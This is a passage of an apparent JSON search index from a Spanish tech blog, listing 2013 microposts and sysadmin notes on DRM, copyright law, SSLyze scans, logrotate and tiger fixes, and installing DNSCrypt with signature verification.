la posición de la Web como la plataforma universal definitiva para acceder al conocimiento, Berners-Lee dijo algo que desató las protestas del mundo libre (tecnológicamente hablando): \"si no ponemos las ayudas necesarias para usar DRM [en la Web], la gente simplemente regresará a usar Flash\". Alan Lazalde | eldiario.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/30/drm-en-html-la-guerra-por-poseer-la-web/","loc":"https://karpoke.ignaciocano.com/2013/03/30/drm-en-html-la-guerra-por-poseer-la-web/"},{"title":"SSLyze","text":"SSLyze es una herramienta para analizar la configuración SSL de un servidor, diseñada para ser rápida y exhaustiva. Un ejemplo de uso: ```bash $ python sslyze --regular localhost:443 REGISTERING AVAILABLE PLUGINS PluginCertInfo PluginSessionRenegotiation PluginCompression PluginSessionResumption PluginOpenSSLCipherSuites CHECKING HOST(S) AVAILABILITY localhost:443 => 127.0.0.1:443 SCAN RESULTS FOR LOCALHOST:443 - 127.0.0.1:443 Compression : Compression Support: Disabled Session Renegotiation : Client-initiated Renegotiations: Rejected Secure Renegotiation: Supported Certificate : Validation w/ Mozilla's CA Store: Certificate is NOT Trusted: self signed certificate in certificate chain Hostname Validation: OK - Common Name Matches SHA1 Fingerprint: 12C4EC1C16807D8654269FBE5E0A8DBFBF1244CC Common Name: localhost Issuer: /C=ES/ST=IB/O=Localhost CA/CN=localhost/emailAddress=postmaster@localhost Serial Number: F525610B96987DAE Not Before: Mar 20 10:31:07 2013 GMT Not After: Mar 20 10:31:07 2014 GMT Signature Algorithm: sha1WithRSAEncryption Key Size: 2048 Unhandled exception when processing --sslv2: utils.ctSSL.errors.ctSSLFeatureNotAvailable - SSLv2 disabled. Session Resumption : With Session IDs: Supported (5 successful, 0 failed, 0 errors, 5 total attempts). With TLS Session Tickets: Supported TLSV1_1 Cipher Suites : Rejected Cipher Suite(s): Hidden Preferred Cipher Suite: RC4-SHA 128 bits HTTP 302 Found - / Accepted Cipher Suite(s): CAMELLIA256-SHA 256 bits HTTP 302 Found - / AES256-SHA 256 bits HTTP 302 Found - / DES-CBC3-SHA 168 bits HTTP 302 Found - / RC4-SHA 128 bits HTTP 302 Found - / CAMELLIA128-SHA 128 bits HTTP 302 Found - / AES128-SHA 128 bits HTTP 302 Found - / Undefined - An unexpected error happened: None TLSV1_2 Cipher Suites : Rejected Cipher Suite(s): Hidden Preferred Cipher Suite: AES128-GCM-SHA256 128 bits HTTP 302 Found - / Accepted Cipher Suite(s): CAMELLIA256-SHA 256 bits HTTP 302 Found - / AES256-SHA256 256 bits HTTP 302 Found - / AES256-SHA 256 bits HTTP 302 Found - / AES256-GCM-SHA384 256 bits HTTP 302 Found - / DES-CBC3-SHA 168 bits HTTP 302 Found - / RC4-SHA 128 bits HTTP 302 Found - / CAMELLIA128-SHA 128 bits HTTP 302 Found - / AES128-SHA256 128 bits HTTP 302 Found - / AES128-SHA 128 bits HTTP 302 Found - / AES128-GCM-SHA256 128 bits HTTP 302 Found - / Undefined - An unexpected error happened: None SSLV3 Cipher Suites : Rejected Cipher Suite(s): Hidden Preferred Cipher Suite: RC4-SHA 128 bits HTTP 302 Found - / Accepted Cipher Suite(s): CAMELLIA256-SHA 256 bits HTTP 302 Found - / AES256-SHA 256 bits HTTP 302 Found - / DES-CBC3-SHA 168 bits HTTP 302 Found - / RC4-SHA 128 bits HTTP 302 Found - / CAMELLIA128-SHA 128 bits HTTP 302 Found - / AES128-SHA 128 bits HTTP 302 Found - / Undefined - An unexpected error happened: None TLSV1 Cipher Suites : Rejected Cipher Suite(s): Hidden Preferred Cipher Suite: RC4-SHA 128 bits HTTP 302 Found - / Accepted Cipher Suite(s): CAMELLIA256-SHA 256 bits HTTP 302 Found - / AES256-SHA 256 bits HTTP 302 Found - / DES-CBC3-SHA 168 bits HTTP 302 Found - / RC4-SHA 128 bits HTTP 302 Found - / CAMELLIA128-SHA 128 bits HTTP 302 Found - / AES128-SHA 128 bits HTTP 302 Found - / Undefined - An unexpected error happened: None SCAN COMPLETED IN 16.95 S ```","tags":"admin","url":"https://karpoke.ignaciocano.com/2013/03/29/sslyze/","loc":"https://karpoke.ignaciocano.com/2013/03/29/sslyze/"},{"title":"Una disputa en torno al spam genera el mayor ataque DDOS registrado en Internet","text":"Varios medios se han hecho eco del que puede ser, probablemente, el mayor ataque de denegación de servicio (DDOS) registrado en la historia de Internet. Todo parece indicar que tras el ataque está una disputa en torno al SPAM. Una de las víctimas, CloudFlare, sitio especializado en la distribución de contenidos, ha confirmado el hecho. El ataque ha tenido lugar entre el 18 y 19 de este mes, afectando a muchos usuarios de la Red y servicios como Netflix. Para entender hasta qué punto el ataque ha sido importante, pensad que un ataque DDOS normal puede suponer un tráfico de 10 Gbps, y éste ha llegado a picos de 300 Gbps, el más importante que se conoce públicamente. F.Manuel | genbeta.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/29/una-disputa-en-torno-al-spam-genera-el-mayor-ataque-ddos-registrado-en-internet/","loc":"https://karpoke.ignaciocano.com/2013/03/29/una-disputa-en-torno-al-spam-genera-el-mayor-ataque-ddos-registrado-en-internet/"},{"title":"La obra de M. C. Escher en la cultura popular","text":"La obra de Maurits Cornelis Escher está plagada de composiciones sorprendentes en las que todos los elementos se fusionan y de perspectivas imposibles (aunque también produjo otro tipo de litografías). Su influencia fue enorme y ha repercutido en cientos de artistas. Pero también se pueden encontrar muchísimos homenajes a Escher en la cultura popular. Desde el celebérrimo gag del sillón de Los Simpson a los créditos de Donnie Darko, pasando por uno de los puzles más conocidos de God of War, estos son algunos ejemplos de la aparición de los diseños del artista holandés (o inspirados en ellos) en diversos campos. Guillermo del Palacio | alt1040.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/28/la-obra-de-m-c-escher-en-la-cultura-popular/","loc":"https://karpoke.ignaciocano.com/2013/03/28/la-obra-de-m-c-escher-en-la-cultura-popular/"},{"title":"Introducing the HTML5 Hard Disk Filler¢ API","text":"The HTML5 Web Storage standard was developed to allow sites to store larger amounts of data (like 5-10 MB) than was previously allowed by cookies (like 4KB). localStorage is awesome because it's supported in all modern browsers (Chrome, Firefox 3.5+, Safari 4+, IE 8+, etc.). The standard anticipated that sites might abuse this feature and advised that browsers limit the total amount of storage space that each origin could use. Feross Aboukhadijeh | feross.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/27/introducing-the-html5-hard-disk-filler-api/","loc":"https://karpoke.ignaciocano.com/2013/03/27/introducing-the-html5-hard-disk-filler-api/"},{"title":"Run time profiling with cProfile","text":"Python is distributed with profiling modules. They describe the run time operation of a pure python program, providing a variety of statistics. The cProfile module is the recommended module. To execute your program under the control of the cProfile module, a simple form is: bash $ python -m cProfile -s cumulative mypythonscript.py Alain Leufroy | logilab.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/27/run-time-profiling-with-cprofile/","loc":"https://karpoke.ignaciocano.com/2013/03/27/run-time-profiling-with-cprofile/"},{"title":"Visualization of Regular Expression Character Classes","text":"We all know the regular expression character classes, right? There are 12 standard classes: bash [:alnum:] [:digit:] [:punct:] [:alpha:] [:graph:] [:space:] [:blank:] [:lower:] [:upper:] [:cntrl:] [:print:] [:xdigit:] But have you seen a visual representation of what these classes match? Probably not. Therefore I created a visualization that illustrates which part of the ASCII set each character class matches. Peteris Krumins | catonmat.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/26/visualization-of-regular-expression-character-classes/","loc":"https://karpoke.ignaciocano.com/2013/03/26/visualization-of-regular-expression-character-classes/"},{"title":"El código Asimov","text":"El hombre artificial siempre fue una fantasía que resulta tan atractiva como inquietante. Como ocurre con las fantasías, tarde o temprano a alguien pensó en llevarla a la práctica. Desde los autómatas de Vaucanson y Jacquet-Droz (tan admirados en el Siglo de las Luces) hasta esos vistosos robots humanoides que la televisión sueles usar para darles color en sus noticieros, aún suelen provocar ciertos temores. Pablo Capanna | pagina12.com.ar","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/24/el-codigo-asimov/","loc":"https://karpoke.ignaciocano.com/2013/03/24/el-codigo-asimov/"},{"title":"Hacking the tag in 100 characters","text":"A short while ago, I discovered that JavaScript allows you to change the href after you click on it. It may not seem that serious at first glance, but rest assured, it can trick customers into giving in their details to fraudsters. » bilaw.al","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/23/hacking-the-tag-in-100-characters/","loc":"https://karpoke.ignaciocano.com/2013/03/23/hacking-the-tag-in-100-characters/"},{"title":"Solucionado el error «error: error running non-shared postrotate script for /var/log/samba/log.nmbd of '/var/log/samba/log.nmbd '»","text":"Si nos encontramos con el siguiente error: bash error: error running non-shared postrotate script for /var/log/samba/log.nmbd of '/var/log/samba/log.nmbd ' En Ubuntu 12.04.2, con la versión de samba 3.6.3, podría producirse cuando el script de logrotate para samba intenta hacer un reload del servicio nmbd y éste no está en ejecución. Necesita un pequeño cambio en los comandos utilizados en la directiva postrotate : deberemos cambiar reload por reload --quiet , quedando finalmente así las respectivas líneas en el fichero /etc/logrorate.d/samba : bash reload --quiet smbd 2>/dev/null reload --quiet nmbd 2>/dev/null","tags":"admin","url":"https://karpoke.ignaciocano.com/2013/03/22/solucionado-el-error-error-error-running-non-shared-postrotate-script-for-varlogsambalog-nmbd-of-varlogsambalog-nmbd/","loc":"https://karpoke.ignaciocano.com/2013/03/22/solucionado-el-error-error-error-running-non-shared-postrotate-script-for-varlogsambalog-nmbd-of-varlogsambalog-nmbd/"},{"title":"Solucionado el error «prelink: ... is not an ELF file»","text":"tiger es una herramienta que comprueba la integridad de ciertos ficheros del sistema. En Ubuntu 12.04.2, la versión instalada es la 3.2.3, y si además estamos usando prelink , puede que tigercron arroje errores del estilo: bash prelink: \"/usr/share/vim/vim73/doc/help.txt\" is not an ELF file El problema parece estar en un uso incorrecto de prelink , ya que no maneja bien la salida de md5sum . Este error creo que todavía no está solucionado, pero en este hilo se incluye un parche que parece que funciona. Descargamos el parche y lo aplicamos, guardando una copia del fichero modificado: bash $ wget -O tiger.patch \"http://bugs.debian.org/cgi-bin/bugreport.cgi?msg=5;filename=tiger.patch;att=1;bug=505906\" $ sudo patch -b /usr/lib/tiger/systems/Linux/2/deb_checkmd5sums < tiger.patch patching file /usr/lib/tiger/systems/Linux/2/deb_checkmd5sums Una vez actualizado, recibiremos un aviso del propio tiger diciendo que el fichero ha sido modificado: bash NEW: --FAIL-- [lin005f] Installed file `/usr/lib/tiger/systems/Linux/2/deb_checkmd5sums' checksum differs from installed package 'tiger'.","tags":"admin","url":"https://karpoke.ignaciocano.com/2013/03/21/solucionado-el-error-prelink-is-not-an-elf-file/","loc":"https://karpoke.ignaciocano.com/2013/03/21/solucionado-el-error-prelink-is-not-an-elf-file/"},{"title":"Exigimos la retirada de la Ley Lassalle (nueva reforma de la Ley de Propiedad Intelectual)","text":"Exigimos la retirada de la Ley Lassalle y la apertura de un diálogo equilibrado, moderado por un mediador neutral, entre las autoridades, ciudadanía en general, artistas, creadores e industria, con el objetivo discutir sobre las auténticas reformas necesarias en la LPI en un diálogo abierto y honesto. No podemos aceptar una reforma en la que la copia privada se convierte de facto en una mera copia personal en una clara desconexión con la realidad y una involución legislativa que no se podía ni concebir ni a finales del siglo pasado y que actúa directamente contra los intereses de creadores y artistas que ven en la copia privada una actividad que les beneficia y sin la cual, muchos no hubieran llegado a ser tales. Stéphane M. Grueso | steph.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/21/exigimos-la-retirada-de-la-ley-lassalle-nueva-reforma-de-la-ley-de-propiedad-intelectual/","loc":"https://karpoke.ignaciocano.com/2013/03/21/exigimos-la-retirada-de-la-ley-lassalle-nueva-reforma-de-la-ley-de-propiedad-intelectual/"},{"title":"Las claves del nuevo canon digital a las universidades: ¿a quién afecta y a quién beneficia?","text":"El Gobierno de Mariano Rajoy planea la creación de un canon digital que se aplicaría a las universidades por los fragmentos de obras sometidas a derechos de autor que distribuyen a través de Internet en sus campus virtuales. Según la Conferencia de Rectores de Universidades Españolas (Crue) y los expertos en derechos de autor y propiedad intelectual, este canon sería ilegal. Para la sociedad de derechos de autor que gestiona los intereses de las editoriales y los autores de textos, Cedro, es una necesidad. \"Si se paga por las fotocopias, cómo no se va a pagar por las copias digitales\", aduce. Ángel Calleja | 20minutos.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/20/las-claves-del-nuevo-canon-digital-a-las-universidades-a-quien-afecta-y-a-quien-beneficia/","loc":"https://karpoke.ignaciocano.com/2013/03/20/las-claves-del-nuevo-canon-digital-a-las-universidades-a-quien-afecta-y-a-quien-beneficia/"},{"title":"Solucionado el error «error: nagiosgrapher:1 duplicate log entry for /var/log/nagiosgrapher/ngraph.log»","text":"nagiosgrapher es un programa que recoge la información de Nagios y crea una serie de gráficos a partir de ella. En Ubuntu 12.04.2, la versión instalada desde los repositorios, 1.7.1-3, tiene un pequeño fallo, de tal manera que logrotate arroja el siguiente error : bash error: nagiosgrapher:1 duplicate log entry for /var/log/nagiosgrapher/ngraph.log error: found error in /var/log/nagiosgrapher/ngraph.log , skipping El fallo está corregido a partir de la versión 1.7.2. Podemos confirmar el fallo si vemos que nagiosgrapher instala dos archivos como los siguientes en el directorio de logrotate : bash $ dpkg -L nagiosgrapher | grep logrotate /etc/logrotate.d /etc/logrotate.d/nagiosgrapher /etc/logrotate.d/nagios_grapher bash $ ls /etc/logrotate.d | grep nagios nagiosgrapher nagios_grapher Uno de ellos, nagios_grapher , hace referencia a un archivo que no existe, /usr/bin/nagios_grapher . Basta con eliminar, o mover a un directorio de backup , este archivo para que ya nos avise del error.","tags":"admin","url":"https://karpoke.ignaciocano.com/2013/03/20/solucionado-el-error-error-nagiosgrapher1-duplicate-log-entry-for-varlognagiosgrapherngraph-log/","loc":"https://karpoke.ignaciocano.com/2013/03/20/solucionado-el-error-error-nagiosgrapher1-duplicate-log-entry-for-varlognagiosgrapherngraph-log/"},{"title":"How High Can You Get?","text":"So I wanted to find out: what exactly is the bug in the program that causes this behavior and also, can it be fixed? First I looked on the Internet to see if the answer has already been found. Some good starting information is located at http://www.jeffsromhack.com/products/donkeykong_tech.htm. There, Jeff Kulczycki breaks down the math of the kill screen, showing the formula that is used to compute the bonus for each level. The formula says the level times 10, plus 40, gives the number of hundreds in the bonus timer. If the result is too large it is forced back down. The key to this is that the level number is used in the calculation. On level 22 an overflow occurs, leaving the player with just 400 points on the timer because the multiplication and addition yields a number larger than 256. Don Hodges | donhodges.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/20/how-high-can-you-get/","loc":"https://karpoke.ignaciocano.com/2013/03/20/how-high-can-you-get/"},{"title":"El principio de exclusión explicado con urinarios","text":"El principio de exclusión de Wolfgang Pauli nos dice que dos electrones en un mismo átomo no pueden tener todos sus números atómicos iguales. ¿Y qué significa eso? Aquí es donde entran los urinarios. En un centro comercial construido en la época dorada del ladrillo, un constructor un poco garrulo decidió poner un solo baño y con unas características especiales: la distancia entre los grupos de urinarios era inmensa, pero le daba la oportunidad de poner anuncios con las innumerables promociones de pisos de lamentable calidad, ridículo tamaño y exorbitante precio que tenía en venta. Así que los clientes no tenían más remedio que pasar por interminables pasillos de promociones fraudulentas para liberarse de su agüita amarilla y, si había suerte, saldrían con una hipoteca de por vida. El zombi de Schrödinger | cuantozombi.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/20/el-principio-de-exclusion-explicado-con-urinarios/","loc":"https://karpoke.ignaciocano.com/2013/03/20/el-principio-de-exclusion-explicado-con-urinarios/"},{"title":"Propiedad intelectual: Preguntas frecuentes sobre la Ley Lasalle","text":"Lo que hace la Ley Lasalle es terminar con ese debate en España decantándolo a la opción más favorable a la industria de los contenidos. La Ley define ahora expresamente lo que es \"acceso legal\" y lo restringe a las copias que se hagan de un soporte original -por lo que la obra ha de estar adherida a un soporte- y siempre que lo hayas adquirido en propiedad por haberlo comprado, excluyendo así copias de obras originales pero alquiladas e incluso las que se hacen de un original que te presta un amigo. Además se exige que esa copia del original que has comprado la hagas por tus propios medios, si la haces \"con asistencia de terceros\", será ilícita. David Bravo | eldiario.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/19/propiedad-intelectual-preguntas-frecuentes-sobre-la-ley-lasalle/","loc":"https://karpoke.ignaciocano.com/2013/03/19/propiedad-intelectual-preguntas-frecuentes-sobre-la-ley-lasalle/"},{"title":"Final Fantasy VII Review (Plot Spoilers)","text":"My review of the 7th installment in the Final Fantasy series. IsanWilshireIII | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/18/final-fantasy-vii-review-plot-spoilers/","loc":"https://karpoke.ignaciocano.com/2013/03/18/final-fantasy-vii-review-plot-spoilers/"},{"title":"CEO Friday: Why we don't hire .NET programmers","text":"See, experience is cheap. All it takes is time. Skill is harder, but really only requires hard work \" a lot of people can get that. But attitude. You either have it, or you don't. The right sort of person is so passionate about coding, they can't be stopped from doing it. They typically started before high school \" sometimes before middle school \" and never looked back. They write everything from assembly to jQuery, on PCs to mobile phones, doing hard core computer graphics to high level social networking. They've tried everything. Everything, that is, but .NET. David Barrett | expensify.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/17/ceo-friday-why-we-dont-hire-net-programmers/","loc":"https://karpoke.ignaciocano.com/2013/03/17/ceo-friday-why-we-dont-hire-net-programmers/"},{"title":"Revisa tu contrato: si contiene una de estas cláusulas, Europa lo considera abusivo","text":"La propia Unión Europea reconoce que los abusos más frecuentes son: excluir o limitar los derechos legales del consumidor con respecto al profesional en caso de incumplimiento imponer al consumidor que no cumpla sus obligaciones una indemnización desproporcionadamente alta incluir la adhesión del consumidor a cláusulas de las cuales no ha tenido la oportunidad de tomar conocimiento real antes de la celebración del contrato supresión u obstaculización del ejercicio de acciones judiciales o de recursos. Ruth Ugalde | lainformacion.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/16/revisa-tu-contrato-si-contiene-una-de-estas-clausulas-europa-lo-considera-abusivo/","loc":"https://karpoke.ignaciocano.com/2013/03/16/revisa-tu-contrato-si-contiene-una-de-estas-clausulas-europa-lo-considera-abusivo/"},{"title":"An open letter from bunnie, author of Hacking the Xbox","text":"No Starch Press and I have decided to release this free ebook version of Hacking the Xbox in honor of Aaron Swartz. As you read this book, I hope that you'll be reminded of how important freedom is to the hacking community and that you'll be inclined to support the causes that Aaron believed in. I agreed to release this book for free in part because Aaron's treatment by MIT is not unfamiliar to me. In this book, you will find the story of when I was an MIT graduate student, extracting security keys from the original Microsoft Xbox. You'll also read about the crushing disappointment of receiving a letter from MIT legal repudiating any association with my work, effectively leaving me on my own to face Microsoft. » nostarch.com - bunnie | bunniestudios.com » Hacking the XBox (PDF)","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/15/an-open-letter-from-bunnie-author-of-hacking-the-xbox/","loc":"https://karpoke.ignaciocano.com/2013/03/15/an-open-letter-from-bunnie-author-of-hacking-the-xbox/"},{"title":"El día negado","text":"Leyendo el espejo lúdico , me encuentro con estas dos preguntas: ¿Hay algún día de la semana en el que nunca puede empezar un siglo? Por el contrario, ¿cuál es el día de la semana que puede ser inicio y final de un siglo? que pueden quedar contestadas rápidamente ejecutando el siguiente comando: bash $ for year in `seq 2001 100 3001`; do cal 1 $year | grep -A2 $year; done | grep --color -B2 \" 1 \" Enero 2001 do lu ma mi ju vi sá 1 2 3 4 5 6 Enero 2101 do lu ma mi ju vi sá 1 Enero 2201 do lu ma mi ju vi sá 1 2 3 Enero 2301 do lu ma mi ju vi sá 1 2 3 4 5 Enero 2401 do lu ma mi ju vi sá 1 2 3 4 5 6 Enero 2501 do lu ma mi ju vi sá 1 Enero 2601 do lu ma mi ju vi sá 1 2 3 Enero 2701 do lu ma mi ju vi sá 1 2 3 4 5 Enero 2801 do lu ma mi ju vi sá 1 2 3 4 5 6 Enero 2901 do lu ma mi ju vi sá 1 Enero 3001 do lu ma mi ju vi sá 1 2 3 Los años divisibles por 100 no son bisiestos, a no ser que sean divisible por 400: ```bash $ cal 2 2000 Febrero 2000 do lu ma mi ju vi sá 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 $ cal 2 2100 Febrero 2100 do lu ma mi ju vi sá 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ``` Por lo que, volviendo a las preguntas, los siglos no pueden comenzar en miércoles, viernes ni domingo. El lunes es él único día que puede ser comienzo y final de siglo. Por ejemplo, en 2001: ```bash $ cal 1 2001 Enero 2001 do lu ma mi ju vi sá 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ cal 12 2001 Diciembre 2001 do lu ma mi ju vi sá 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ```","tags":"memo","url":"https://karpoke.ignaciocano.com/2013/03/14/el-dia-negado/","loc":"https://karpoke.ignaciocano.com/2013/03/14/el-dia-negado/"},{"title":"¿Cuánto cuesta hacer un ping todas las direcciones de Internet?","text":"Internet, la red de redes; todas las organizaciones modernas del mundo están conectadas a Internet. Un gran número de individuos disponemos de conexión a Internet, en el trabajo, en el domicilio particular y en el dispositivo móvil. Esto nos puede hacer pensar que estamos hablando de un vasto rango de direcciones, dentro de las cuales los atacantes pueden centrar sus ataques en una organización determinada. Por ahora tomaremos como toda Internet el espacio de direcciones de IPv4. Cuando se despliegue y esté en uso IPv6, está claro que todo esto cambiara y habrá un nivel añadido de complejidad. Pero, ¿y si quisiéramos realizar una acción contra todas y cada una de las direcciones de Internet? ¿Sería viable? ¿Cuánto nos costaría? ¿Recursos técnicos? ¿Recursos físicos? ¿Tiempo? ¿Dinero? Dami Soler securityartwork.es , | securityartwork.es » xkcd.com Suhas Mathur | suhasmathur.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/13/cuanto-cuesta-hacer-un-ping-todas-las-direcciones-de-internet/","loc":"https://karpoke.ignaciocano.com/2013/03/13/cuanto-cuesta-hacer-un-ping-todas-las-direcciones-de-internet/"},{"title":"Godzilla","text":"No hay duda de que Japón se ha convertido en el paraíso frikinal (con permiso de Howard Wolowitz). Desde los dibujos animados de Mazinger Z de mi niñez al Naruto de la de mis hijos, el país del sol naciente nos ha proporcionado una buena provisión de cine y literatura friki. Pero sin duda, el rey de todo ese paraíso es un enorme lagarto, dinosaurio, dragón o lo que sea. Por supuesto, me refiero a Godzilla. Arturo Quirantes | naukas.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/09/godzilla/","loc":"https://karpoke.ignaciocano.com/2013/03/09/godzilla/"},{"title":"El cifrado sin control, no sirve de nada","text":"Últimamente, tanto en auditorías que realizamos, como en código que encuentro en la red, hay una cosa que me llama poderosamente la atención, y es el mal uso (o uso incompleto) de las funciones de criptografía. Por lo general, el procedimiento que suelen seguir los desarrolladores que no están en contacto con el mundo de la seguridad, suelen consistir en coger un método que venga con la API del lenguaje o en una librería de terceros, buscar el método que implementa el algoritmo de cifrado de turno, rellenar la firma del método y almacenar la salida. Joel Sevilleja | securityartwork.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/05/el-cifrado-sin-control-no-sirve-de-nada/","loc":"https://karpoke.ignaciocano.com/2013/03/05/el-cifrado-sin-control-no-sirve-de-nada/"},{"title":"Python internals: adding a new statement to Python","text":"This article is an attempt to better understand how the front-end of Python works. Just reading documentation and source code may be a bit boring, so I'm taking a hands-on approach here: I'm going to add an until statement to Python. All the coding for this article was done against the cutting-edge Py3k branch in the Python Mercurial repository mirror. Eli Bendersky | eli.thegreenplace.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/01/python-internals-adding-a-new-statement-to-python/","loc":"https://karpoke.ignaciocano.com/2013/03/01/python-internals-adding-a-new-statement-to-python/"},{"title":"Keyboard rubik's cube","text":"This is my keyboard rubik's cube. Must be solved in the normal way, but you have toï'¿ consider the centers and positioning the right way when you are solving the cube. Miguel Alonso | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/02/25/keyboard-rubiks-cube/","loc":"https://karpoke.ignaciocano.com/2013/02/25/keyboard-rubiks-cube/"},{"title":"Superman vs Hulk - The Fight","text":"Superman finds Hulk somewhere in the Mojave Desert. This is a prelude to a fight sequence in progress and will be posted some time in the future. Animation by Michael Habjan, created with Autodesk Maya 2009, composited and edited in Adobe After Effects CS3. Music done with Propellerhead Reason 5. Michael Habjan | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/02/24/superman-vs-hulk-the-fight/","loc":"https://karpoke.ignaciocano.com/2013/02/24/superman-vs-hulk-the-fight/"},{"title":"Logran que un cuadricóptero sea capaz de lanzar y equilibrar un péndulo invertido","text":"Un equipo de investigadores del Instituto de Tecnología de Suecia ha conseguido que unos cuadricópteros sean capaces de lanzar péndulos invertidos y, lo que es más sorprendente, atraparlos al vuelo y equilibrarlos. Para lograrlo, tienen que ser conscientes del ángulo de lanzamiento y de 'aterrizaje' del péndulo, entre otros factores, y deben tener la capacidad de aprender de sus errores. Guillermo del Palacio | alt1040.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/02/23/logran-que-un-cuadricoptero-sea-capaz-de-lanzar-y-equilibrar-un-pendulo-invertido/","loc":"https://karpoke.ignaciocano.com/2013/02/23/logran-que-un-cuadricoptero-sea-capaz-de-lanzar-y-equilibrar-un-pendulo-invertido/"},{"title":"Bobina de Tesla reproduce la melodía de Super Mario Bros","text":"Estudiantes de ingeniería de la Universidad del Sur de Florida han trabajado durante 2 años en un proyecto que les ha llevado a construir una bobina de Tesla de 3 metros de altura capaz de producir corriente alterna. Su creacíon tiene además la particularidad de que se puede configurar para que reproduzca versiones de melodías famosas mediante el tono de los grandes arcos eléctricos que genera. Para demostrarlo, han hecho que imite el tema principal de Super Mario Bros. Este es el resultado que han obtenido: Jose | abadiadigital.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/02/22/bobina-de-tesla-reproduce-la-melodia-de-super-mario-bros/","loc":"https://karpoke.ignaciocano.com/2013/02/22/bobina-de-tesla-reproduce-la-melodia-de-super-mario-bros/"},{"title":"A year in the life of a kernel mantainer by Greg Kroah-Hartman","text":"","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/02/22/a-year-in-the-life-of-a-kernel-mantainer-by-greg-kroah-hartman/","loc":"https://karpoke.ignaciocano.com/2013/02/22/a-year-in-the-life-of-a-kernel-mantainer-by-greg-kroah-hartman/"},{"title":"Diez comandos de ADB que deberías conocer","text":"Una de las muchas razones por la que una gran cantidad de usuarios elegimos Android es por la facilidad de uso y las muchas cosas que podemos hacer cuando conectamos nuestro dispositivo al ordenador. Muchas veces, al actualizar el teléfono o tablet a una nueva versión, ponerle una ROM cocinada o conseguir permisos de superusuario (root), necesitamos tener más contacto con el aparato que el que nos da el programa que usemos en ese instante (Odín en los Samsung, por ejemplo). El ADB (Android Debug Bridge) es un programa para ordenador que nos servirá de puente para conectar nuestros androides a la computadora y poder así interactuar con ellos de una forma más \"avanzada\" y completa. Vamos a ver cómo se hace y algunos comandos básicos. Aitor Santana | elandroidelibre.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/02/09/diez-comandos-de-adb-que-deberias-conocer/","loc":"https://karpoke.ignaciocano.com/2013/02/09/diez-comandos-de-adb-que-deberias-conocer/"},{"title":"Hidden Secret Codes for Google Android Mobile Phones","text":"Recently I got a Google Android mobile phone \"Samsung Galaxy I7500\". While I'm loving playing with it, I also found some interesting secret codes which can enable/disable lots of hidden settings in the mobile phone. These codes can also show many useful information about the phone. » askvg.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/02/09/hidden-secret-codes-for-google-android-mobile-phones/","loc":"https://karpoke.ignaciocano.com/2013/02/09/hidden-secret-codes-for-google-android-mobile-phones/"},{"title":"Cifrando el tráfico DNS","text":"DNSCrypt proporciona un servicio local para resolver nombres de dominio que permite cifrar el tráfico entre nuestro equipo y el servidor DNS primario, por defecto OpenDNS, lo que ayuda a protegerse de ataques MitM y phishing y proporciona cierta confidencialidad en las peticiones DNS. Instalación Para instalarlo, basta que nos decarguemos el paquete con el código fuente: bash $ wget http://download.dnscrypt.org/dnscrypt-proxy/dnscrypt-proxy-1.2.0.tar.bz2 $ wget http://download.dnscrypt.org/dnscrypt-proxy/dnscrypt-proxy-1.2.0.tar.bz2.sig Comprobamos el paquete: bash $ gpg --verify dnscrypt-proxy-1.2.0.tar.bz2.sig dnscrypt-proxy-1.2.0.tar.bz2 gpg: Firmado el vie 12 oct 2012 01:28:27 CEST usando clave DSA ID 1CDEA439 gpg: Imposible comprobar la firma: Clave pública no encontrada Para poder comprobar la firma, buscamos la clave y la añadimos: bash $ gpg --search-keys 1CDEA439 gpg: buscando ;`1CDEA439;' de hkp servidor keys.gnupg.net (1) Jedi/Sector One Frank DENIS (Jedi/Sector One) Frank DENIS (Jedi/Sector One) <0daydigestATpureftpd.org> 1024 bit DSA key 1CDEA439, creado: 2002-03-10 Keys 1-1 of 1 for \"1CDEA439\". Introduzca número(s), O)tro, o F)in > 1 gpg: solicitando clave 1CDEA439 de hkp servidor keys.gnupg.net gpg: clave 1CDEA439: clave pública \"Jedi/Sector One \" importada Ahora volvemos a realizar la comprobación: bash $ gpg --verify dnscrypt-proxy-1.2.0.tar.bz2.sig dnscrypt-proxy-1.2.0.tar.bz2 gpg: Firmado el vie 12 oct 2012 01:28:27 CEST usando clave DSA ID 1CDEA439 gpg: Firma correcta de ;`Jedi/Sector One ;' gpg: alias ;`Frank DENIS (Jedi/Sector One) ;' gpg: alias ;`Frank DENIS (Jedi/Sector One) 